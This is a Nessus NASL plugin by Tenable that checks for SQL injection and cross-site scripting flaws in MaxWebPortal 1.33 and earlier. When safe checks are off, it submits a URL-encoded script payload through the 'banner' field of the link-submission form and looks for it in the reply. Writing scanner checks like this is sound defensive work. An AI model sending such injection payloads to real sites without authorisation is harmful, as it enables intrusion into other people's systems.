#
# (C) Tenable Network Security
#


if (description) {
  script_id(17688);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-1016", "CVE-2005-1017");
  script_bugtraq_id(12968);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"15197");

  name["english"] = "MaxWebPortal <= 1.33 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains an ASP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running a version of MaxWebPortal that is prone to
multiple input validation vulnerabilities:

  - Multiple SQL Injection Vulnerabilities
    An attacker can inject SQL statements via various scripts 
    to manipulate database queries.

  - A Cross-Site Scripting Vulnerability
    An attacker can pass arbitrary HTML and script code via
    the 'banner' parameter of the 'links_add_form.asp' script
    to be executed by a user's browser in the context of the
    affected web site whenever he views the malicious link.

See also :

http://www.hackerscenter.com/archive/view.asp?id=1807

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 5
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in MaxWebPortal <= 1.33";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("cross_site_scripting.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Some variables to use when trying an exploit.
# - a url to submit.
#   nb: gettimeofday() ensures the URL is unique (otherwise,
#       MaxWebPortal will reject the submission).
new_url = string("http://www.example.com/", gettimeofday());
# - the submitter's email address.
from = get_kb_item("SMTP/headers/From");
if (!from) from = "nobody@example.com";
# - a simple alert to display "Nessus was here".
xss = "<script>alert('Nessus was here');</script>";
#   nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";


# Check various directories for MaxWebPortal.
foreach dir (cgi_dirs()) {
  # Pull up the link add page.
  req = http_get(item:string(dir, "/links_add_form.asp"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If safe checks are enabled...
  if (safe_checks()) {
    # Test the version number.
    #
    # nb: a more complete version number can be found in "site_info.asp".
    if (egrep(string:res, pattern:'<title="Powered By: MaxWebPortal.info Version 1\\.([0-2]|3[0-3])', icase:TRUE)) {
      security_warning(port);
      exit(0);
    }
  }
  # Else try the exploit as long as the server itself isn't 
  # vulnerable to XSS attacks.
  #
  # nb: this will not catch those forums that don't accept submissions
  #     or accept them only from logged-in users.
  else if (!get_kb_item("www/"+port+"/generic_xss")) {
    # We need an existing category.
    pat = 'option value="([0-9]+)">';
    matches = egrep(pattern:pat, string:res, icase:TRUE);
    foreach match (split(matches)) {
      match = chomp(match);
      cat = eregmatch(pattern:pat, string:match, icase:TRUE);
      if (!isnull(cat)) {
        cat = cat[1];
        break;
      }
    }
    # If we don't have one, take a wild guess.
    if (isnull(cat)) cat = 2;

    postdata = string(
      "cat=", cat, "&",
      "name=Nessus+Plugin+Test&",
      "url=", new_url, "&",
      "mail=", from, "&",
      "des=Generated+automatically+by+", SCRIPT_NAME, "&",
      "key=&",
      "banner=%3E", exss, "&",
      "B1=Submit"
    );
    req = string(
      "POST ",  dir, "/links_add_url.asp HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If we see our exploit, there's a problem.
    if (xss >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
